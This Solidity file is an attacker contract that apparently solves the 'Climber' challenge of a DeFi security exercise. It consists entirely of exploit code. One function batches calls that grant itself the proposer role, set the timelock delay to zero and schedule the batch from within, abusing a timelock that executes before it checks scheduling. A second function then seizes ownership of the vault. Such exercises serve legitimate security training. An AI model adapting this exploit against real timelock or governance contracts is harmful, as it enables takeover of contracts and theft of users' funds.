// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";
import "./ClimberVault.sol";

contract ClimberAttacker {
    ClimberTimelock private immutable _timelock;
    ClimberVault private immutable _vault;

    bytes32 public constant SALT = keccak256("salt");
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    constructor(address payable timelockAddress, address vaultAddress) {
        _timelock = ClimberTimelock(timelockAddress);
        _vault = ClimberVault(vaultAddress);
    }

    function schedule() external {
        address[] memory targets = new address[](3);
        targets[0] = address(_timelock);
        targets[1] = address(_timelock);
        targets[2] = address(this);

        uint256[] memory values = new uint256[](3);

        bytes[] memory dataElements = new bytes[](3);
        dataElements[0] = abi.encodeWithSelector(
            _timelock.grantRole.selector, PROPOSER_ROLE, address(this)
        );
        dataElements[1] = abi.encodeWithSelector(_timelock.updateDelay.selector, 0);
        dataElements[2] = abi.encodeWithSelector(this.schedule.selector);

        _timelock.schedule(targets, values, dataElements, SALT);
    }

    function transferOwnershipTo(address toAddress) external {
        address[] memory targets = new address[](1);
        targets[0] = address(_vault);

        uint256[] memory values = new uint256[](1);

        bytes[] memory dataElements = new bytes[](1);
        dataElements[0] = abi.encodeWithSignature(
            "transferOwnership(address)", toAddress
        );

        _timelock.schedule(targets, values, dataElements, SALT);
        _timelock.execute(targets, values, dataElements, SALT);
    }
}
